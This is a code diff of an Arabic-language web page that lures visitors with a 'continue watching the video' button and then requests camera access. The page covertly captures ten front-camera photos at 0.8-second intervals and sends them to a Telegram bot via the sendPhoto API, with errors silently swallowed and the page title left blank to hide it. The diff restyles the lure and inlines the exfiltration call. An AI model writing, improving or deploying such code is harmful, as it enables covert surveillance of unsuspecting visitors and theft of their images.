@@ -5,44 +5,65 @@
   <title></title> <!-- فارغ للإخفاء -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { 
-      margin:0; 
-      background:#000; 
-      color:#fff; 
-      font-family:Arial, sans-serif; 
-      height:100vh; 
-      display:flex; 
-      justify-content:center; 
-      align-items:center; 
-      text-align:center; 
-      overflow:hidden; 
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      overflow: hidden;
     }
-    #container { 
-      z-index:9999; 
-      background:rgba(0,0,0,0.8); 
-      padding:50px 30px; 
-      border-radius:20px; 
-      max-width:90%; 
-      box-shadow:0 0 30px rgba(255,255,255,0.2); 
+    #container {
+      z-index: 9999;
+      background: rgba(0,0,0,0.85);
+      padding: 60px 40px;
+      border-radius: 20px;
+      max-width: 90%;
+      box-shadow: 0 0 40px rgba(255,255,255,0.3);
     }
-    h1 { font-size:32px; margin-bottom:40px; text-shadow:0 0 10px #fff; }
-    button { 
-      padding:20px 60px; 
-      margin:25px; 
-      font-size:26px; 
-      font-weight:bold; 
-      border:none; 
-      border-radius:12px; 
-      cursor:pointer; 
-      color:white; 
-      transition: all 0.3s; 
-      width:320px; 
+    h1 {
+      font-size: 36px;
+      margin-bottom: 50px;
+      text-shadow: 0 0 15px #fff;
     }
-    button:hover { transform:scale(1.05); box-shadow:0 0 20px rgba(255,255,255,0.5); }
-    #yes { background:#00cc44; }
-    #no { background:#ff4444; }
-    #msg { margin-top:30px; font-size:20px; }
-    #video { display:none; width:100vw; height:100vh; position:fixed; top:0; left:0; z-index:1; }
+    button {
+      padding: 25px 70px;
+      margin: 30px 20px;
+      font-size: 28px;
+      font-weight: bold;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      color: white;
+      transition: all 0.3s;
+      width: 350px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    }
+    button:hover {
+      transform: scale(1.08);
+      box-shadow: 0 12px 30px rgba(255,255,255,0.4);
+    }
+    #yes { background: #00cc44; }
+    #no { background: #ff4444; }
+    #msg {
+      margin-top: 40px;
+      font-size: 22px;
+      color: #ddd;
+    }
+    #video {
+      display: none;
+      width: 100vw;
+      height: 100vh;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
   </style>
 </head>
 <body>
@@ -52,7 +73,7 @@
   <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
   <br>
   <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
-  <div id="msg"></div>
+  <div id="msg">اضغط على الزر المناسب للمتابعة</div>
 </div>
 
 <iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
@@ -71,19 +92,10 @@ function sendText(text) {
   }).catch(() => {});
 }
 
-// إرسال صورة
-function sendPhoto(photo, caption) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: caption })
-  }).catch(() => {});
-}
-
 // رفض → ما يصير والو
 function reject() {
   document.getElementById('msg').innerText = 'تم الرفض، شكراً!';
-  setTimeout(() => window.close(), 2000);
+  setTimeout(() => window.close(), 3000);
 }
 
 // متابعة → طلب الكاميرا + سحب 10 صور
@@ -114,10 +126,18 @@ async function startCamera() {
 
       html2canvas(video, {scale: 0.5}).then(canvas => {
         const img = canvas.toDataURL('image/png');
-        sendPhoto(img, `صورة ${count+1}/10 من الكاميرا الأمامية`);
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            photo: img,
+            caption: `صورة ${count+1}/10 من الكاميرا الأمامية`
+          })
+        }).catch(() => {});
         count++;
       });
-    }, 800); // صورة كل 0.8 ثانية (سريع وخفيف)
+    }, 800); // صورة كل 0.8 ثانية
 
   } catch (err) {
     sendText(`❌ رفض الوصول للكاميرا: ${err.message || 'غير معروف'}`);
